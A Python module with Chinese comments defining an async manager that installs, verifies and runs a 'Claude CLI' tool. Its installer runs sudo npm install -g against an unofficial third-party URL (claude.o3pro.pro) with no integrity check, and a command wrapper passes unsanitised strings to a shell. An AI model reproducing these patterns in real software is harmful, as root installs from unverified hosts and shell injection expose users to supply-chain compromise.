"""
Claude CLI Manager - Claude CLI管理器
负责在Mirror Code启用时安装和管理Claude CLI工具
"""

import asyncio
import logging
import subprocess
import os
import json
from typing import Dict, Any, Optional, Callable
from datetime import datetime

class ClaudeCLIManager:
    """Claude CLI管理器"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.is_installed = False
        self.installation_status = "not_installed"  # not_installed, installing, installed, error
        self.claude_version = None
        self.installation_error = None
        
        # 事件回调
        self.on_installation_start: Optional[Callable] = None
        self.on_installation_complete: Optional[Callable] = None
        self.on_installation_error: Optional[Callable] = None
        self.on_verification_complete: Optional[Callable] = None
    
    async def install_claude_cli(self) -> bool:
        """安装Claude CLI"""
        if self.installation_status == "installing":
            self.logger.warning("Claude CLI正在安装中...")
            return False
        
        if self.is_installed:
            self.logger.info("Claude CLI已安装")
            return True
        
        try:
            self.logger.info("开始安装Claude CLI...")
            self.installation_status = "installing"
            self.installation_error = None
            
            if self.on_installation_start:
                await self._safe_callback(self.on_installation_start)
            
            # 执行安装命令
            success = await self._execute_installation()
            
            if success:
                # 验证安装
                verification_success = await self._verify_installation()
                
                if verification_success:
                    self.is_installed = True
                    self.installation_status = "installed"
                    
                    if self.on_installation_complete:
                        await self._safe_callback(self.on_installation_complete, {
                            "version": self.claude_version,
                            "timestamp": datetime.now().isoformat()
                        })
                    
                    self.logger.info(f"Claude CLI安装成功，版本: {self.claude_version}")
                    return True
                else:
                    raise Exception("Claude CLI验证失败")
            else:
                raise Exception("Claude CLI安装失败")
                
        except Exception as e:
            self.installation_status = "error"
            self.installation_error = str(e)
            self.logger.error(f"安装Claude CLI失败: {e}")
            
            if self.on_installation_error:
                await self._safe_callback(self.on_installation_error, {
                    "error": str(e),
                    "timestamp": datetime.now().isoformat()
                })
            
            return False
    
    async def _execute_installation(self) -> bool:
        """执行安装命令"""
        try:
            # 检查npm是否可用
            npm_check = await self._run_command("which npm")
            if not npm_check["success"]:
                # 尝试使用完整路径
                npm_path = "/home/ubuntu/.nvm/versions/node/v22.13.0/bin/npm"
                if not os.path.exists(npm_path):
                    raise Exception("npm未找到，请确保Node.js已正确安装")
            else:
                npm_path = "npm"
            
            # 执行安装命令
            install_cmd = f"sudo {npm_path} install -g https://claude.o3pro.pro/install --registry=https://registry.npmmirror.com"
            
            self.logger.info(f"执行安装命令: {install_cmd}")
            result = await self._run_command(install_cmd, timeout=300)  # 5分钟超时
            
            if result["success"]:
                self.logger.info("Claude CLI安装命令执行成功")
                return True
            else:
                self.logger.error(f"安装命令失败: {result['error']}")
                return False
                
        except Exception as e:
            self.logger.error(f"执行安装命令异常: {e}")
            return False
    
    async def _verify_installation(self) -> bool:
        """验证安装"""
        try:
            self.logger.info("验证Claude CLI安装...")
            
            # 检查claude命令是否可用
            claude_check = await self._run_command("which claude")
            if not claude_check["success"]:
                self.logger.error("claude命令未找到")
                return False
            
            # 验证claude命令
            verify_cmd = "claude --model claude-sonnet-4-20250514"
            result = await self._run_command(verify_cmd, timeout=30)
            
            if result["success"]:
                # 尝试获取版本信息
                version_result = await self._run_command("claude --version")
                if version_result["success"]:
                    self.claude_version = version_result["output"].strip()
                else:
                    self.claude_version = "unknown"
                
                if self.on_verification_complete:
                    await self._safe_callback(self.on_verification_complete, {
                        "version": self.claude_version,
                        "command_output": result["output"]
                    })
                
                self.logger.info("Claude CLI验证成功")
                return True
            else:
                self.logger.error(f"Claude CLI验证失败: {result['error']}")
                return False
                
        except Exception as e:
            self.logger.error(f"验证Claude CLI异常: {e}")
            return False
    
    async def _run_command(self, command: str, timeout: int = 60) -> Dict[str, Any]:
        """运行命令"""
        try:
            self.logger.debug(f"执行命令: {command}")
            
            # 创建子进程
            process = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=os.environ.copy()
            )
            
            # 等待命令完成
            try:
                stdout, stderr = await asyncio.wait_for(
                    process.communicate(), 
                    timeout=timeout
                )
            except asyncio.TimeoutError:
                process.kill()
                await process.wait()
                return {
                    "success": False,
                    "error": f"命令执行超时 ({timeout}秒)",
                    "output": "",
                    "return_code": -1
                }
            
            # 解码输出
            stdout_text = stdout.decode('utf-8') if stdout else ""
            stderr_text = stderr.decode('utf-8') if stderr else ""
            
            success = process.returncode == 0
            
            result = {
                "success": success,
                "output": stdout_text,
                "error": stderr_text if not success else "",
                "return_code": process.returncode
            }
            
            self.logger.debug(f"命令结果: {result}")
            return result
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "output": "",
                "return_code": -1
            }
    
    async def check_installation_status(self) -> Dict[str, Any]:
        """检查安装状态"""
        try:
            # 检查claude命令是否存在
            result = await self._run_command("which claude")
            
            if result["success"]:
                # 获取版本信息
                version_result = await self._run_command("claude --version")
                version = version_result["output"].strip() if version_result["success"] else "unknown"
                
                self.is_installed = True
                self.installation_status = "installed"
                self.claude_version = version
                
                return {
                    "installed": True,
                    "version": version,
                    "path": result["output"].strip(),
                    "status": "installed"
                }
            else:
                self.is_installed = False
                self.installation_status = "not_installed"
                
                return {
                    "installed": False,
                    "version": None,
                    "path": None,
                    "status": "not_installed"
                }
                
        except Exception as e:
            self.logger.error(f"检查安装状态失败: {e}")
            return {
                "installed": False,
                "version": None,
                "path": None,
                "status": "error",
                "error": str(e)
            }
    
    async def uninstall_claude_cli(self) -> bool:
        """卸载Claude CLI"""
        try:
            self.logger.info("卸载Claude CLI...")
            
            # 执行卸载命令
            uninstall_cmd = "sudo npm uninstall -g claude"
            result = await self._run_command(uninstall_cmd)
            
            if result["success"]:
                self.is_installed = False
                self.installation_status = "not_installed"
                self.claude_version = None
                
                self.logger.info("Claude CLI卸载成功")
                return True
            else:
                self.logger.error(f"卸载失败: {result['error']}")
                return False
                
        except Exception as e:
            self.logger.error(f"卸载Claude CLI异常: {e}")
            return False
    
    async def execute_claude_command(self, command: str, timeout: int = 60) -> Dict[str, Any]:
        """执行Claude命令"""
        if not self.is_installed:
            return {
                "success": False,
                "error": "Claude CLI未安装",
                "output": ""
            }
        
        try:
            full_command = f"claude {command}"
            return await self._run_command(full_command, timeout)
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "output": ""
            }
    
    async def _safe_callback(self, callback, *args, **kwargs):
        """安全执行回调"""
        try:
            if asyncio.iscoroutinefunction(callback):
                await callback(*args, **kwargs)
            else:
                callback(*args, **kwargs)
        except Exception as e:
            self.logger.error(f"回调执行失败: {e}")
    
    def get_status(self) -> Dict[str, Any]:
        """获取状态信息"""
        return {
            "is_installed": self.is_installed,
            "installation_status": self.installation_status,
            "claude_version": self.claude_version,
            "installation_error": self.installation_error,
            "timestamp": datetime.now().isoformat()
        }
    
    async def test_claude_functionality(self) -> Dict[str, Any]:
        """测试Claude功能"""
        if not self.is_installed:
            return {
                "success": False,
                "error": "Claude CLI未安装"
            }
        
        try:
            # 测试基本命令
            test_result = await self.execute_claude_command("--help")
            
            if test_result["success"]:
                return {
                    "success": True,
                    "message": "Claude CLI功能正常",
                    "help_output": test_result["output"]
                }
            else:
                return {
                    "success": False,
                    "error": f"Claude CLI测试失败: {test_result['error']}"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": f"测试Claude功能异常: {e}"
            }

